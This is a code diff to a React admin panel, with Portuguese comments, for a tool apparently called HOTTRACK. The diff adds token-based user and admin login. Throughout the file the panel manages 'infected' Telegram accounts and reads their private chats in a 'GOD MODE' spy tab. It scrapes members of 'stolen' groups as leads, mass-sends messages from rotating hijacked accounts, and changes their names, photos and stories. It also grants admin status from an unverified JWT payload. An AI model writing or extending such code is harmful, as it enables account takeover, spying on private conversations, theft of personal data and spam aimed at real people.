@@ -3,7 +3,12 @@ import { useState, useEffect, useRef } from 'react';
 export default function AdminPanel() {
   // --- ESTADOS DE AUTENTICAÇÃO ---
   const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [loginMode, setLoginMode] = useState('user'); // 'user' ou 'admin'
+  const [usernameInput, setUsernameInput] = useState('');
   const [passwordInput, setPasswordInput] = useState('');
+  const [adminTokenInput, setAdminTokenInput] = useState('');
+  const [authToken, setAuthToken] = useState('');
+  const [isAdmin, setIsAdmin] = useState(false);
   
   // --- NAVEGAÇÃO ---
   const [tab, setTab] = useState('dashboard'); 
@@ -44,6 +49,21 @@ export default function AdminPanel() {
 
   // --- INICIALIZAÇÃO ---
   useEffect(() => {
+    // Verifica se há token salvo no localStorage
+    const savedToken = localStorage.getItem('authToken');
+    if (savedToken) {
+      setAuthToken(savedToken);
+      setIsAuthenticated(true);
+      // Decodifica JWT para verificar se é admin (sem verificar assinatura, apenas ler payload)
+      try {
+        const payload = JSON.parse(atob(savedToken.split('.')[1]));
+        setIsAdmin(payload.isAdmin === true || payload.type === 'admin');
+      } catch (e) {
+        // Se não conseguir decodificar, assume que não é admin
+        setIsAdmin(false);
+      }
+    }
+
     // Tenta recuperar cache local do scanner para não perder dados ao recarregar a página
     const savedGroups = localStorage.getItem('godModeGroups');
     const savedChannels = localStorage.getItem('godModeChannels');
@@ -54,17 +74,29 @@ export default function AdminPanel() {
     if (savedChannels) {
         setAllChannels(JSON.parse(savedChannels));
     }
-    
+  }, []);
+
+  useEffect(() => {
     // Se já estiver autenticado, busca os dados atualizados do servidor
-    if (isAuthenticated) {
+    if (isAuthenticated && authToken) {
         fetchData();
     }
-  }, [isAuthenticated]);
+  }, [isAuthenticated, authToken]);
+
+  // Função helper para fazer requisições autenticadas
+  const authenticatedFetch = async (url, options = {}) => {
+    const headers = {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${authToken}`,
+      ...options.headers
+    };
+    return fetch(url, { ...options, headers });
+  };
 
   const fetchData = async () => {
     try {
       // 1. Carrega Contas Infectadas
-      const sRes = await fetch('/api/list-sessions');
+      const sRes = await authenticatedFetch('/api/list-sessions');
       const sData = await sRes.json();
       
       setSessions(prev => {
@@ -77,13 +109,13 @@ export default function AdminPanel() {
       });
       
       // 2. Carrega Estatísticas de Leads
-      const stRes = await fetch('/api/stats');
+      const stRes = await authenticatedFetch('/api/stats');
       if (stRes.ok) {
           setStats(await stRes.json());
       }
       
       // 3. Carrega Memória de Grupos já Roubados (para marcar em verde)
-      const hRes = await fetch('/api/get-harvested');
+      const hRes = await authenticatedFetch('/api/get-harvested');
       const hData = await hRes.json();
       if(hData.harvestedIds) {
           setHarvestedIds(new Set(hData.harvestedIds));
@@ -99,24 +131,66 @@ export default function AdminPanel() {
   };
 
   // --- AUTENTICAÇÃO ---
-  const handleLogin = async (e) => {
+  const handleUserLogin = async (e) => {
     e.preventDefault();
+    if (!usernameInput || !passwordInput) {
+      alert('Preencha usuário e senha');
+      return;
+    }
     try {
-      const res = await fetch('/api/admin-login', {
+      const res = await fetch('/api/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ password: passwordInput })
+        body: JSON.stringify({ username: usernameInput, password: passwordInput })
       });
       const data = await res.json();
       if(data.success) { 
-          setIsAuthenticated(true); 
-          fetchData();
+          setAuthToken(data.token);
+          setIsAdmin(false);
+          setIsAuthenticated(true);
+          localStorage.setItem('authToken', data.token);
+          setUsernameInput('');
+          setPasswordInput('');
       } else {
-          alert('Senha incorreta');
+          alert(data.error || 'Credenciais inválidas');
       }
     } catch (e) { 
         alert('Erro de conexão na autenticação.'); 
     }
+  };
+
+  const handleAdminTokenLogin = async (e) => {
+    e.preventDefault();
+    if (!adminTokenInput) {
+      alert('Informe a senha administrativa');
+      return;
+    }
+    try {
+      const res = await fetch('/api/admin-login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ password: adminTokenInput })
+      });
+      const data = await res.json();
+      if(data.success) { 
+          setAuthToken(data.token);
+          setIsAdmin(true);
+          setIsAuthenticated(true);
+          localStorage.setItem('authToken', data.token);
+          setAdminTokenInput('');
+      } else {
+          alert(data.error || 'Senha incorreta');
+      }
+    } catch (e) { 
+        alert('Erro de conexão na autenticação.'); 
+    }
+  };
+
+  const handleLogout = () => {
+    setIsAuthenticated(false);
+    setAuthToken('');
+    setIsAdmin(false);
+    localStorage.removeItem('authToken');
   };
 
   // ==============================================================================
@@ -133,10 +207,9 @@ export default function AdminPanel() {
       // Verifica um por um para não sobrecarregar a API/Servidor
       for(let i=0; i < currentSessions.length; i++) {
           try {
-              const res = await fetch('/api/check-status', {
+              const res = await authenticatedFetch('/api/check-status', {
                   method: 'POST',
-                  body: JSON.stringify({ phone: currentSessions[i].phone_number }),
-                  headers: {'Content-Type': 'application/json'}
+                  body: JSON.stringify({ phone: currentSessions[i].phone_number })
               });
               const data = await res.json();
               
@@ -174,10 +247,9 @@ export default function AdminPanel() {
   const handleDeleteSession = async (phone) => {
       if(!confirm(`⚠️ Remover permanentemente a conta ${phone}?`)) return;
       
-      await fetch('/api/delete-session', { 
+      await authenticatedFetch('/api/delete-session', { 
           method: 'POST', 
-          body: JSON.stringify({phone}), 
-          headers: {'Content-Type': 'application/json'} 
+          body: JSON.stringify({phone})
       });
       
       setSessions(prev => prev.filter(s => s.phone_number !== phone));
@@ -235,7 +307,7 @@ export default function AdminPanel() {
 
              // 1. Busca um lote de leads pendentes no banco
              // A API get-campaign-leads JÁ ESTÁ configurada para trazer Usernames primeiro
-             const res = await fetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}`);
+             const res = await authenticatedFetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}`);
              const data = await res.json();
              const leads = data.leads || [];
              
@@ -259,9 +331,8 @@ export default function AdminPanel() {
                      const senderIndex = (totalSentCount + index) % availableSenders.length;
                      const sender = availableSenders[senderIndex];
                      
-                     return fetch('/api/dispatch', {
+                     return authenticatedFetch('/api/dispatch', {
                          method: 'POST',
-                         headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                              senderPhone: sender,
                              target: lead.user_id,
@@ -334,10 +405,9 @@ export default function AdminPanel() {
           const phone = sessions[i].phone_number;
           setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
           try {
-              const res = await fetch('/api/spy/list-chats', { 
+              const res = await authenticatedFetch('/api/spy/list-chats', { 
                   method: 'POST', 
-                  body: JSON.stringify({ phone }), 
-                  headers: {'Content-Type': 'application/json'} 
+                  body: JSON.stringify({ phone })
               });
               const data = await res.json();
               if (data.chats) {
@@ -387,15 +457,14 @@ export default function AdminPanel() {
           const target = targets[i];
           
           try {
-              const res = await fetch('/api/spy/harvest', { 
+              const res = await authenticatedFetch('/api/spy/harvest', { 
                   method: 'POST', 
                   body: JSON.stringify({ 
                       phone: target.ownerPhone, 
                       chatId: target.id, 
                       chatName: target.title, 
                       isChannel: target.type === 'Canal' 
-                  }), 
-                  headers: {'Content-Type': 'application/json'} 
+                  })
               });
               const data = await res.json();
               if(data.success) {
@@ -421,10 +490,9 @@ export default function AdminPanel() {
       setLoadingHistory(true);
       setChatHistory([]);
       try {
-        const res = await fetch('/api/spy/get-history', { 
+        const res = await authenticatedFetch('/api/spy/get-history', { 
             method: 'POST', 
-            body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), 
-            headers: {'Content-Type': 'application/json'} 
+            body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id })
         });
         const data = await res.json();
         setChatHistory(data.history || []);
@@ -436,15 +504,14 @@ export default function AdminPanel() {
 
   const stealLeadsManual = async (chat) => {
       addLog(`🕷️ Extraindo manualmente de ${chat.title}...`);
-      const res = await fetch('/api/spy/harvest', { 
+      const res = await authenticatedFetch('/api/spy/harvest', { 
           method: 'POST', 
           body: JSON.stringify({ 
               phone: chat.ownerPhone, 
               chatId: chat.id, 
               chatName: chat.title, 
               isChannel: chat.type === 'Canal' 
-          }), 
-          headers: {'Content-Type': 'application/json'} 
+          })
       });
       const data = await res.json();
       if(data.success) {
@@ -465,10 +532,9 @@ export default function AdminPanel() {
     setProcessing(true);
     for (const phone of Array.from(selectedPhones)) {
         addLog(`🎭 Atualizando identidade em ${phone}...`);
-        await fetch('/api/update-profile', { 
+        await authenticatedFetch('/api/update-profile', { 
             method: 'POST', 
-            headers: {'Content-Type': 'application/json'}, 
-            body: JSON.stringify({ phone, newName, photoUrl }) 
+            body: JSON.stringify({ phone, newName, photoUrl })
         });
     }
     setProcessing(false); 
@@ -480,10 +546,9 @@ export default function AdminPanel() {
       setProcessing(true);
       for (const phone of Array.from(selectedPhones)) {
           addLog(`📸 Postando Story em ${phone}...`);
-          await fetch('/api/post-story', { 
+          await authenticatedFetch('/api/post-story', { 
               method: 'POST', 
-              headers: {'Content-Type': 'application/json'}, 
-              body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) 
+              body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption })
           });
       }
       setProcessing(false); 
@@ -496,11 +561,26 @@ export default function AdminPanel() {
 
   // --- RENDERIZAÇÃO (INTERFACE GRÁFICA) ---
   if (!isAuthenticated) return (
-      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
-          <form onSubmit={handleLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
-              <h2 style={{color:'white', textAlign:'center', marginTop:0, fontFamily:'monospace'}}>HOTTRACK ADMIN</h2>
-              <input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha Mestra" style={{padding:'15px', width:'250px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white'}} autoFocus />
-          </form>
+      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center', flexDirection:'column', gap:'20px'}}>
+          <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
+              <button onClick={()=>setLoginMode('user')} style={{padding:'10px 20px', background: loginMode==='user'?'#3390ec':'transparent', color:'white', border:'1px solid #3390ec', borderRadius:'6px', cursor:'pointer'}}>Login Usuário</button>
+              <button onClick={()=>setLoginMode('admin')} style={{padding:'10px 20px', background: loginMode==='admin'?'#3390ec':'transparent', color:'white', border:'1px solid #3390ec', borderRadius:'6px', cursor:'pointer'}}>Token Admin</button>
+          </div>
+          
+          {loginMode === 'user' ? (
+              <form onSubmit={handleUserLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
+                  <h2 style={{color:'white', textAlign:'center', marginTop:0, fontFamily:'monospace'}}>HOTTRACK ADMIN</h2>
+                  <input type="text" value={usernameInput} onChange={e=>setUsernameInput(e.target.value)} placeholder="Usuário" style={{padding:'15px', width:'250px', marginBottom:'10px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white', display:'block'}} autoFocus />
+                  <input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha" style={{padding:'15px', width:'250px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white', display:'block'}} />
+                  <button type="submit" style={{width:'100%', padding:'15px', marginTop:'10px', background:'#3390ec', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}>Entrar</button>
+              </form>
+          ) : (
+              <form onSubmit={handleAdminTokenLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #8957e5', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
+                  <h2 style={{color:'white', textAlign:'center', marginTop:0, fontFamily:'monospace'}}>TOKEN ADMINISTRATIVO</h2>
+                  <input type="password" value={adminTokenInput} onChange={e=>setAdminTokenInput(e.target.value)} placeholder="Senha Administrativa" style={{padding:'15px', width:'250px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white'}} autoFocus />
+                  <button type="submit" style={{width:'100%', padding:'15px', marginTop:'10px', background:'#8957e5', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}>Entrar</button>
+              </form>
+          )}
       </div>
   );
 
@@ -544,7 +624,11 @@ export default function AdminPanel() {
             <button onClick={()=>setTab('dashboard')} style={{padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', color:'white', border:'1px solid #238636', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🚀 CRM TURBO</button>
             <button onClick={()=>setTab('spy')} style={{padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', color:'white', border:'1px solid #8957e5', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👁️ GOD MODE</button>
             <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🛠️ TOOLS</button>
-            <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e'}}>v6.0 (Estratégia Híbrida)</div>
+            <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e', display:'flex', alignItems:'center', gap:'15px'}}>
+                {isAdmin && <span style={{color:'#8957e5', fontWeight:'bold'}}>🔑 ADMIN</span>}
+                <span>v6.0 (Estratégia Híbrida)</span>
+                <button onClick={handleLogout} style={{padding:'8px 15px', background:'#f85149', color:'white', border:'none', borderRadius:'6px', cursor:'pointer', fontSize:'12px', fontWeight:'bold'}}>Sair</button>
+            </div>
         </div>
 
         {/* --- ABA DASHBOARD (DISPARO) --- */}
